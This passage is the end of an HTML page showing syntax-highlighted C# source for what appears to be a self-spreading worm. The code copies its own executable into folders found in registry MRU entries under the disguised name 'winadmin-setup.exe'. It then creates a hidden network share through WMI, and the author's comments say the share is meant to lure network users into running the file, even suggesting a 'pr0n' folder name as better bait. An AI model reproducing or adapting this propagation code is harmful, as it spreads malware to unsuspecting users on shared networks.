                    </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">reg</span><span class="sc10">.</span><span class="sc11">GetValue</span><span class="sc10">(</span><span class="sc11">valuename</span><span class="sc10">).</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">valuename</span><span class="sc10">.</span><span class="sc11">ToLower</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">"mrulist"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">try</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc13">@"\\winadmin-setup.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">er</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">reg</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">er</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">CreateShare</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            
            </span><span class="sc2">//we create our own shared folder on the network called Yeha
</span><span class="sc0">            </span><span class="sc2">//this is so if we get a user browsing the network they might
</span><span class="sc0">            </span><span class="sc2">//open it up and double click winadmin-setup.exe. You know a user
</span><span class="sc0">            </span><span class="sc2">//might be more susceptible to pick it up if the folder was 
</span><span class="sc0">            </span><span class="sc2">//named pr0n or porn hehehe. 
</span><span class="sc0">
            </span><span class="sc5">try</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">CreateDirectory</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">ManagementClass</span><span class="sc0"> </span><span class="sc11">managementClass</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ManagementClass</span><span class="sc10">(</span><span class="sc6">"Win32_Share"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">ManagementBaseObject</span><span class="sc0"> </span><span class="sc11">inParams</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">managementClass</span><span class="sc10">.</span><span class="sc11">GetMethodParameters</span><span class="sc10">(</span><span class="sc6">"Create"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">ManagementBaseObject</span><span class="sc0"> </span><span class="sc11">outParams</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">inParams</span><span class="sc10">[</span><span class="sc6">"Description"</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">inParams</span><span class="sc10">[</span><span class="sc6">"Name"</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">inParams</span><span class="sc10">[</span><span class="sc6">"Path"</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dir</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">inParams</span><span class="sc10">[</span><span class="sc6">"Type"</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x0</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">outParams</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">managementClass</span><span class="sc10">.</span><span class="sc11">InvokeMethod</span><span class="sc10">(</span><span class="sc6">"Create"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inParams</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">);</span><span class="sc0">
                
                </span><span class="sc2">//if the return value was 0 then we know we got the folder created
</span><span class="sc0">                </span><span class="sc2">//so we are going to make it hidden..
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">uint</span><span class="sc10">)(</span><span class="sc11">outParams</span><span class="sc10">.</span><span class="sc11">Properties</span><span class="sc10">[</span><span class="sc6">"ReturnValue"</span><span class="sc10">].</span><span class="sc11">Value</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//make the dir hidden
</span><span class="sc0">                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">Exists</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">DirectoryInfo</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">DirectoryInfo</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">d</span><span class="sc10">.</span><span class="sc11">Attributes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FileAttributes</span><span class="sc10">.</span><span class="sc11">Hidden</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


  

</span></div></body>
</html>
